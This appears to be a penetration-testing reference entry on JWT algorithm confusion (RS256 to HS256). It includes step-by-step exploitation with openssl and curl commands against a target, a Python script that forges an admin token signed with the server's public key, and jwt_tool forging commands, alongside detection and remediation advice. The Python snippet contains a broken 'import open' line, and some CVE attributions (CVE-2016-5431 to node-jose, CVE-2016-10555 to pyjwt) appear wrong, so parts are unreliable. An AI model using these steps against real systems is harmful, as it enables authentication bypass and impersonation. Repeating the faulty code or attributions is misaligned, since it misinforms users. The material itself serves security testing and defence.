# JWT Algorithm Confusion (RS256 → HS256)

**Category:** JWT Vulnerabilities / Authentication Bypass
**Severity:** Critical
**CVEs:** CVE-2016-5431, CVE-2016-10555
**Last Updated:** 2026-02-04

## Attack Description

Algorithm confusion (aka key confusion) exploits JWT implementations that accept algorithm-switching from asymmetric (RS256) to symmetric (HS256). When a server signs JWTs with RS256 (private key), it verifies with the public key. If an attacker switches the algorithm to HS256, the server uses the **public key as the HMAC secret** — a key the attacker already knows.

This is devastating because RS256 public keys are often exposed (TLS certificates, JWKS endpoints, `.well-known` configs).

## Prerequisites

- Server uses RS256 (or RS384/RS512) for JWT signing
- JWT library does not enforce a fixed algorithm on the server side
- Attacker can obtain the server's public key (often trivially available)

## Exploitation Steps

### Step 1: Obtain the server's public key
```bash
# From TLS certificate
openssl s_client -connect target.com:443 2>&1 < /dev/null | \
  sed -n '/-----BEGIN/,/-----END/p' > cert.pem

# Extract public key
openssl x509 -pubkey -in cert.pem -noout > pubkey.pem

# Or from JWKS endpoint
curl https://target.com/.well-known/jwks.json
```

### Step 2: Decode the original JWT
```bash
python3 jwt_tool.py <JWT> -V  # View token structure
```

### Step 3: Modify the header
Change algorithm from RS256 to HS256:
```json
{"alg": "HS256", "typ": "JWT"}
```

### Step 4: Modify the payload
Escalate privileges or impersonate another user.

### Step 5: Sign with the public key as HMAC secret
```python
import jwt
import open

with open('pubkey.pem', 'r') as f:
    public_key = f.read()

payload = {"sub": "admin", "role": "owner"}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

**Note:** Some JWT libraries block this by default. Use `jwt_tool` or older library versions:
```bash
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
```

### Step 6: Replay the forged token

## Key Format Gotchas

The attack often fails due to key format mismatches:
- **PEM vs DER** — server may expect different encoding
- **Line endings** — `\n` vs `\r\n` matters for HMAC input
- **Certificate chain** — server might use intermediate cert, not leaf
- **X.509 vs bare key** — try both the full certificate and extracted public key
- **JWKS n/e parameters** — if using JWKS, reconstruct PEM from modulus and exponent

If one format fails, try conversions:
```bash
# Strip headers for raw base64
grep -v '^-' pubkey.pem | tr -d '\n'

# Convert DER to PEM
openssl x509 -inform DER -outform PEM -in cert.der -out cert.pem
```

## Detection Method

### As a Pentester
1. Check if JWKS endpoint exists (`/.well-known/jwks.json`, `/oauth/certs`)
2. Extract public key from TLS cert or JWKS
3. Forge token with HS256 + public key
4. Test multiple key format variations
5. Use `jwt_tool -X k` for automated testing

### As a Defender
- Log algorithm used in each JWT verification
- Alert on algorithm changes between token issuance and verification
- Monitor for HS256 tokens when system only issues RS256

## Remediation

1. **Hardcode the expected algorithm server-side**
   ```javascript
   // Node.js
   jwt.verify(token, publicKey, { algorithms: ['RS256'] });
   
   // NEVER do this:
   jwt.verify(token, key); // Trusts alg from header
   ```
2. **Use separate key objects** — asymmetric key objects cannot be used as HMAC secrets in well-typed libraries
3. **Upgrade JWT libraries** — modern versions of `jsonwebtoken`, `PyJWT`, etc. mitigate this
4. **JWKS validation** — if using JWKS, validate key type matches expected algorithm

## Real-World Examples

### 1. CVE-2016-5431 — node-jose library
- RS256→HS256 confusion allowed arbitrary token forgery
- Public key used as HMAC secret
- Fixed in later versions by enforcing algorithm checks

### 2. CVE-2016-10555 — pyjwt library
- Same confusion pattern in Python JWT library
- Allowed signing with public RSA key as HS256 secret

### 3. CVE-2018-0114 — node-jose (JWK Header Injection)
- Attacker embeds arbitrary JWK public key in JWT header
- Library trusts attacker-supplied key for signature verification
- Full token forgery with attacker-generated keypair

### 4. CVE-2025-30144 — Library Validation Bypass (2025)
- JWT validation library allowed algorithm confusion
- Affected enterprise systems globally
- Severity: High

## Web3 Context

Algorithm confusion is especially dangerous in Web3 stacks because:
- **DeFi API gateways** often use RS256 with publicly accessible JWKS
- **Multi-chain bridges** may share JWT infrastructure across services
- **Web3 SaaS platforms** (analytics, portfolio trackers) often expose certs
- **Attack chain:** Get public key → forge admin JWT → access API → drain user data or trigger privileged operations

## Tools

| Tool | Usage |
|------|-------|
| jwt_tool | `python3 jwt_tool.py <JWT> -X k -pk pubkey.pem` |
| Burp Suite JOSEPH | JWS tab → Key Confusion Attack → Load PEM |
| SignSaboteur (Burp) | Automated algorithm confusion testing |
| PyJWT (old versions) | Manual PoC scripting |

## References

- PortSwigger Algorithm Confusion: https://portswigger.net/web-security/jwt/algorithm-confusion
- Auth0 Critical JWT Vulnerabilities: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- HackTricks JWT: https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- Red Sentry JWT 2026 Guide: https://redsentry.com/resources/blog/jwt-vulnerabilities-list-2026-security-risks-mitigation-guide
